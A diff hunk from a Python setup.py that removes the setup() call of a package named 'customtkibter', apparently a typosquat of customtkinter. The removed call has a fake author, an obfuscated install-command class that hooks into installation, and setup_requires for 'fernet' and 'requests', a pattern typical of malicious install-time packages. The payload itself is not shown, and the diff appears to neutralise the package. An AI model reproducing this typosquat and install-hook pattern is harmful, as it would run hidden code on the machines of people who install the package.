@@ -18,22 +18,5 @@ class QnimqSoqMbpKeZGZrPUQANkYnNYTpsUVsCcuKxzDNxiIoNpQNCAylGlNwDOEIQpOxsw(instal
             install.run(self)
 
 
-setup(
-    name="customtkibter",
-    version=VERSION,
-    author="paAEzbndaRKWJ",
-    author_email="FfDmwsv@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': QnimqSoqMbpKeZGZrPUQANkYnNYTpsUVsCcuKxzDNxiIoNpQNCAylGlNwDOEIQpOxsw,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 
